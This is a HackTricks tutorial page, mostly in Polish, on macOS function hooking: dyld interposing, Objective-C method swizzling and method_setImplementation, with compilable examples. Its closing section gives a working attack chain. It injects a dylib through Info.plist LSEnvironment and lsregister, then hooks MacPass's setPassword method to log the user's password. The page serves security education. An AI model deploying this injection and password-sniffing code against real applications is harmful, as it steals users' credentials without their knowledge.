# macOS Function Hooking

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów na GitHubie.**

</details>

## Interpozycja funkcji

Utwórz **dylib** z sekcją **`__interpose`** (lub sekcją oznaczoną jako **`S_INTERPOSING`**), zawierającą krotki wskaźników na funkcje, które odnoszą się do **oryginalnych** i **zastępczych** funkcji.

Następnie **wstrzyknij** dylib z użyciem **`DYLD_INSERT_LIBRARIES`** (interpozycja musi nastąpić przed załadowaniem głównej aplikacji). Oczywiście [**ograniczenia** dotyczące użycia **`DYLD_INSERT_LIBRARIES`** również mają zastosowanie tutaj](macos-library-injection/#check-restrictions).

### Interpozycja printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

typedef int (*orig_open_type)(const char *pathname, int flags);
typedef FILE *(*orig_fopen_type)(const char *pathname, const char *mode);

int open(const char *pathname, int flags) {
    orig_open_type orig_open;
    orig_open = (orig_open_type)dlsym(RTLD_NEXT, "open");
    printf("Opening file: %s\n", pathname);
    return orig_open(pathname, flags);
}

FILE *fopen(const char *pathname, const char *mode) {
    orig_fopen_type orig_fopen;
    orig_fopen = (orig_fopen_type)dlsym(RTLD_NEXT, "fopen");
    printf("Opening file: %s\n", pathname);
    return orig_fopen(pathname, mode);
}
```

This code demonstrates how to perform function hooking in macOS using the `dlsym` function. The `open` and `fopen` functions are intercepted and their behavior is modified to print a message before executing the original function. The `orig_open_type` and `orig_fopen_type` typedefs are used to define function pointers to the original functions.

To compile and use this code, follow these steps:

1. Save the code to a file named `interpose2.c`.
2. Compile the code using the following command: `gcc -dynamiclib -o interpose2.dylib interpose2.c -ldl`.
3. Set the `DYLD_INSERT_LIBRARIES` environment variable to the path of the generated `interpose2.dylib` file.
4. Run any program that uses the `open` or `fopen` functions, and you will see the messages printed before the original functions are executed.

This technique can be used for various purposes, such as logging function calls, modifying function behavior, or implementing security measures. However, it should be used responsibly and ethically, as function hooking can potentially be abused for malicious purposes.

```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```

## Metoda Swizzling

W ObjectiveC metoda jest wywoływana w ten sposób: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Potrzebne są **obiekt**, **metoda** i **parametry**. Gdy metoda jest wywoływana, wysyłane jest **msg** za pomocą funkcji **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Obiektem jest **`someObject`**, metodą jest **`@selector(method1p1:p2:)`**, a argumentami są **value1** i **value2**.

Przez analizę struktur obiektów, można dotrzeć do **tablicy metod**, w której znajdują się **nazwy** i **wskaźniki** do kodu metody.

{% hint style="danger" %}
Należy zauważyć, że ponieważ metody i klasy są dostępne na podstawie swoich nazw, te informacje są przechowywane w pliku binarnym, więc można je odzyskać za pomocą `otool -ov </path/bin>` lub [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
{% endhint %}

### Dostęp do surowych metod

Możliwe jest uzyskanie informacji o metodach, takich jak nazwa, liczba parametrów lub adres, jak w poniższym przykładzie:

```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```

### Metoda Swizzling z method\_exchangeImplementations

Funkcja **`method_exchangeImplementations`** pozwala **zmienić** **adres** **implementacji** jednej funkcji na drugą.

{% hint style="danger" %}
Kiedy funkcja jest wywoływana, **wykonywana jest inna funkcja**.
{% endhint %}

```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```

{% hint style="warning" %}
W tym przypadku, jeśli **kod implementacji prawidłowej** metody **weryfikuje** jej **nazwę**, może **wykryć** to podmienianie i zapobiec jego uruchomieniu.

Następująca technika nie ma takiego ograniczenia.
{% endhint %}

### Podmienianie metod za pomocą method\_setImplementation

Poprzedni format jest dziwny, ponieważ zmieniasz implementację dwóch metod na siebie nawzajem. Za pomocą funkcji **`method_setImplementation`** możesz **zmienić implementację metody na inną**.

Pamiętaj tylko, aby **zapisać adres implementacji oryginalnej metody**, jeśli zamierzasz ją wywołać z nowej implementacji przed jej nadpisaniem, ponieważ później będzie znacznie trudniej zlokalizować ten adres.

```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```

## Metodyka ataku za pomocą hookowania

Na tej stronie omówiono różne sposoby hookowania funkcji. Jednakże, wymagały one **uruchomienia kodu wewnątrz procesu w celu przeprowadzenia ataku**.

Aby to zrobić, najłatwiejszą techniką jest wstrzyknięcie [Dyld za pomocą zmiennych środowiskowych lub przejęcie kontroli](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Jednakże, wydaje mi się, że można to również zrobić za pomocą [wstrzykiwania procesu Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Obie opcje są jednak **ograniczone** do **niechronionych** binarnych/procesów. Sprawdź każdą technikę, aby dowiedzieć się więcej o ograniczeniach.

Atak za pomocą hookowania funkcji jest jednak bardzo konkretny, atakujący będzie to robił w celu **ukradzenia wrażliwych informacji z wnętrza procesu** (jeśli nie, to przeprowadziłby po prostu atak wstrzykiwania procesu). A te wrażliwe informacje mogą znajdować się w pobranych przez użytkownika aplikacjach, takich jak MacPass.

Wektor ataku polegałby więc na znalezieniu podatności lub usunięciu sygnatury aplikacji, a następnie wstrzyknięciu zmiennej środowiskowej **`DYLD_INSERT_LIBRARIES`** poprzez plik Info.plist aplikacji, dodając coś w rodzaju:

```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```

a następnie **ponownie zarejestruj** aplikację:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Dodaj do tej biblioteki kod hookingowy w celu wykradzenia informacji: hasła, wiadomości...

{% hint style="danger" %}
Należy pamiętać, że w nowszych wersjach macOS, jeśli **usuniesz sygnaturę** binarnego pliku aplikacji i został on wcześniej uruchomiony, macOS **nie będzie już uruchamiał aplikacji**.
{% endhint %}

#### Przykład biblioteki

```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```

## Odwołania

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów GitHub.

</details>
